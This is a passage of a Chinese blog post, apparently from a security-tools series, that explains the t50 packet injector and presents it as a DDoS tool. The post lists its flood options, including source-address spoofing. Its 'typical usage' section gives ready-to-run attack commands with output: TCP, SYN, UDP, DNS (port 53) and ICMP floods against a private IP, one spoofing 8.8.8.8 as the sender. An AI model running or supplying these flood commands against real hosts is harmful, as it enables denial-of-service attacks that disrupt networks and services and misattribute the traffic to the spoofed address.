--ospf-lsa-flag-NT        OSPF Router-LSA NSSA translation (default RANDOM)</span><br><span class="line">    --ospf-lsa-link-id ADDR   OSPF Router-LSA <span class="built_in">link</span> ID          (default RANDOM)</span><br><span class="line">    --ospf-lsa-link-data ADDR OSPF Router-LSA <span class="built_in">link</span> data        (default RANDOM)</span><br><span class="line">    --ospf-lsa-link-type NUM  OSPF Router-LSA <span class="built_in">link</span> <span class="built_in">type</span>        (default 1)</span><br><span class="line">    --ospf-lsa-attached ADDR  OSPF Network-LSA attached router (default RANDOM)</span><br><span class="line">    --ospf-lsa-larger         OSPF ASBR/NSSA-LSA ext. larger   (default OFF)</span><br><span class="line">    --ospf-lsa-forward ADDR   OSPF ASBR/NSSA-LSA forward       (default RANDOM)</span><br><span class="line">    --ospf-lsa-external ADDR  OSPF ASBR/NSSA-LSA external      (default RANDOM)</span><br><span class="line">    --ospf-vertex-router      OSPF Group-LSA <span class="built_in">type</span> router       (default RANDOM)</span><br><span class="line">    --ospf-vertex-network     OSPF Group-LSA <span class="built_in">type</span> network      (default RANDOM)</span><br><span class="line">    --ospf-vertex-id ADDR     OSPF Group-LSA vertex ID         (default RANDOM)</span><br><span class="line">    --ospf-lls-extended-LR    OSPF LLS Extended option LR      (default OFF)</span><br><span class="line">    --ospf-lls-extended-RS    OSPF LLS Extended option RS      (default OFF)</span><br><span class="line">    --ospf-authentication     OSPF authentication included     (default OFF)</span><br><span class="line">    --ospf-auth-key-id NUM    OSPF authentication key ID       (default 1)</span><br><span class="line">    --ospf-auth-sequence NUM  OSPF authentication sequence <span class="comment">#   (default RANDOM)</span></span><br><span class="line"></span><br><span class="line">Some considerations <span class="keyword">while</span> running this program:</span><br><span class="line"> 1. There is no limitation of using as many options as possible.</span><br><span class="line"> 2. Report t50 bugs at https://gitlab.com/fredericopissarra/t50.git.</span><br><span class="line"> 3. Some header fields with default values MUST be <span class="built_in">set</span> to <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> RANDOM.</span><br><span class="line"> 4. Mandatory arguments to long options are mandatory <span class="keyword">for</span> short options too.</span><br><span class="line"> 5. Be <span class="built_in">nice</span> when using t50, the author DENIES its use <span class="keyword">for</span> DoS/DDoS purposes.</span><br><span class="line"> 6. Running t50 with <span class="string">&#x27;--protocol T50&#x27;</span> option sends ALL protocols sequentially.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>支持所有协议可以使用<code>-l</code>查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# t50 -l</span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO]  List of supported protocols (--protocol):</span><br><span class="line">         1 - ICMP       (Internet Control Message Protocol)</span><br><span class="line">         2 - IGMPv1     (Internet Group Message Protocol v1)</span><br><span class="line">         3 - IGMPv3     (Internet Group Message Protocol v3)</span><br><span class="line">         4 - TCP        (Transmission Control Protocol)</span><br><span class="line">         5 - EGP        (Exterior Gateway Protocol)</span><br><span class="line">         6 - UDP        (User Datagram Protocol)</span><br><span class="line">         7 - RIPv1      (Routing Internet Protocol v1)</span><br><span class="line">         8 - RIPv2      (Routing Internet Protocol v2)</span><br><span class="line">         9 - DCCP       (Datagram Congestion Control Protocol)</span><br><span class="line">         10 - RSVP      (Resource Reservation Protocol)</span><br><span class="line">         11 - IPSEC     (Internet Security Protocl (AH/ESP))</span><br><span class="line">         12 - EIGRP     (Enhanced Interior Gateway Routing Protocol)</span><br><span class="line">         13 - OSPF      (Open Shortest Path First)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>核心参数如下:</p>
+<ol>
+<li><p><code>--threshold</code>:并发线程数,默认<code>1000</code></p>
+</li>
+<li><p><code>--flood</code>:最大功率攻击,与<code>threshold</code>冲突</p>
+</li>
+<li><p><code>--protocol</code>:设置攻击模型</p>
+</li>
+<li><p><code>--protocol T50</code>:这是一个模拟协议,使用所有支持的协议进行dos</p>
+</li>
+<li><p><code>--turbo</code>:使用子线程是的攻击流程更快,但是会占用更多本地资源</p>
+</li>
+<li><p><code>--sport/--dport</code>:自定义原始端口以及目标端口,默认随机生成</p>
+</li>
+<li><p><code>-s/--saddr</code>:模拟发送方的ip,默认随机生成</p>
+</li>
+<li><p>在使用tcp模式时可以设置一些特殊的flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-F,--fin                     TCP FIN flag                     (default OFF)</span><br><span class="line">-S,--syn                     TCP SYN flag                     (default OFF)</span><br><span class="line">-R,--rst                     TCP RST flag                     (default OFF)</span><br><span class="line">-P,--psh                     TCP PSH flag                     (default OFF)</span><br><span class="line">-A,--ack                     TCP ACK flag                     (default OFF)</span><br><span class="line">-U,--urg                     TCP URG flag                     (default OFF)</span><br><span class="line">-E,--ece                     TCP ECE flag                     (default OFF)</span><br><span class="line">-C,--cwr                     TCP CWR flag                     (default OFF)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>tcp标志如下</p>
+<ol>
+<li>SYN:TCP三次握手中,如果A是发起端,则A就对服务器发一个SYN报文,表示建立连接</li>
+<li>ACK:收到数据或请求后发送响应时发送ACK报文</li>
+<li>RST:表示连接重置</li>
+<li>FIN:TCP四次挥手时,表示关闭连接</li>
+<li>PSH:发送端需要发送一段数据,这个数据需要接收端一收到就进行向上交付.而接收端在收到PSH标志位有效的数据时,迅速将数据交付给应用层.所以PSH又叫急迫比特.但是现在已经不需要将数据交付给应用层了,因为这些效果在TCP栈已经可以自行处理这些问题了.</li>
+<li>URG:URG成为紧急指针,意为URG位有效的数据包,是一个紧急需要处理的数据包,需要接收端在接收到之后迅速处理.(没有规定必须与PSH一样刷新缓冲区)</li>
+<li>ece:设置标志表示发生阻塞</li>
+<li>cwr:设置CWR告知对方已接受到拥塞通知</li>
+</ol>
+</li>
+</ol>
+<h1 id="0x3-典型用法"><a href="#0x3-典型用法" class="headerlink" title="0x3 典型用法"></a>0x3 典型用法</h1><ul>
+<li><p>针对tcp发动洪水工具,随机发送方</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol TCP 10.25.153.231</span><br><span class="line"><span class="comment"># 日志如下</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852680</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:48:26 2022</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>模拟成8.8.8.8 发送tcp攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol TCP --saddr 8.8.8.8 10.25.153.231</span><br><span class="line"><span class="comment"># 日志如下</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852682</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:48:47 2022</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用sync配合tcp攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol TCP --syn --saddr 8.8.8.8 10.25.153.231</span><br><span class="line"><span class="comment"># 日志如下</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852688</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:49:02 2022</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发送udp攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol UDP 10.25.153.231</span><br><span class="line"><span class="comment"># 日志如下</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852689</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:49:18 2022</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击dns服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol UDP --dport 53 10.25.153.231</span><br><span class="line"><span class="comment"># 日志如下</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852690</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:49:32 2022</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击ICMP链路</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol ICMP 10.25.153.231</span><br><span class="line"><span class="comment"># 日志如下</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852691</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:49:45 20</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>某些协议&#x2F;攻击可能被防火墙拦截,这是就会出现如下错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">t50 --flood --protocol T50 10.25.153.231</span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">[INFO] Entering flood mode...[INFO] Performing stress testing...</span><br><span class="line">[INFO] Hit Ctrl+C to stop...</span><br><span class="line">[INFO] PID=2852702</span><br><span class="line">[INFO] t50 5.8.7 successfully launched at Sun Apr 24 14:50:18 2022</span><br><span class="line"></span><br><span class="line">[FATAL] t50: Cannot send packet (Permission!?). Please check your firewall rules (iptables?).</span><br><span class="line">[INFO] (PID:2852702) packets:    148734 (8152163 bytes sent).</span><br><span class="line">[INFO] (PID:2852702) throughput: 81847.85 packets/second.</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by 杨CC, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/DDOS-CC工具/" class="tag">#DDOS-CC工具</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2025/01/17/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8-amap/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">端口扫描神器-amap</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2025/01/17/%E5%8F%AF%E8%A7%86%E5%8C%96cms%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7-FrameScan-GUi/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">可视化cms检测工具-FrameScan-GUi</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">杨CC与杨小亿的世界</h2>
+                
+                <a href="/" class="item">首页</a>
+                
+                <a href="/archives" class="item">归档</a>
+                
+                <a href="/tags" class="item">标签</a>
+                
+                <a href="/categories" class="item">分类</a>
+                
+                <a href="/about" class="item">关于</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+                <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn" class="item">冀ICP备2024064089号-1</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">友情链接</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/Sgyling/Free-proxy-pool" class="item">代理池</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZapcoMan" class="item">ReverseVibe</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">我的</h2>
+                
+                <a target="_blank" rel="noopener" href="https://t.me/time_766" class="item">TG</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/Sgyling" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://qm.qq.com/q/z51eGUnIbu" class="item">QQ交流群</a>
+                
+                <a target="_blank" rel="noopener" href="https://space.bilibili.com/500076166?spm_id_from=333.1007.0.0" class="item">BiliBili</a>
+                
+                <a href="mailto:sgyling@gmail.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2025 杨CC<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
